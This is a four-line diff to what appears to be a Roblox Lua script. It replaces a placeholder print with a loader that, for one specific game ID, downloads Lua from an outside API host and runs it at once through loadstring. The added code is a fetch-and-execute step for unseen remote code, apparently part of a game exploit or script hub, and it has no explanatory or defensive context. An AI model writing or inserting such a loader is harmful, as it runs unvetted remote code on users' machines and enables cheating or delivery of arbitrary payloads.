@@ -1,1 +1,4 @@
-print("larp")
+if game.PlaceId == 17625359962 or game.GameId == 17625359962 then
+    loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/8604c290034dd269089a543ffbd68c96a5e585ee30f1f3dd6745c8507d2991cf/download"))()
+end
+
